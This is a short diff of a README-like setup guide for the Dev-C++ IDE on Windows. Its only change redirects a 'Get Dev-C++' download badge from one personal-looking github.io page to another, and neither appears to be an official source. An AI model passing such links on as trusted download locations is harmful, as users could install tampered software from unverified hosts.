@@ -74,7 +74,7 @@ C++17 is the practical language level, with part of C++20 highlighted in the edi
 
 Pick one Windows build. The installer lays down the IDE and a compiler. A portable zip keeps settings beside the program folder, which is handy on a lab image where each student should leave the machine as they found it.
 
-[![Get Dev-C++](https://img.shields.io/badge/Get-Dev--C%2B%2B-1D4ED8?style=flat&labelColor=0F172A&logoColor=white)](https://teresiacrickard.github.io/.github/Dev-C++)
+[![Get Dev-C++](https://img.shields.io/badge/Get-Dev--C%2B%2B-1D4ED8?style=flat&labelColor=0F172A&logoColor=white)](https://dev-c-software.github.io/Dev-C-/)
 
 ### First launch
 
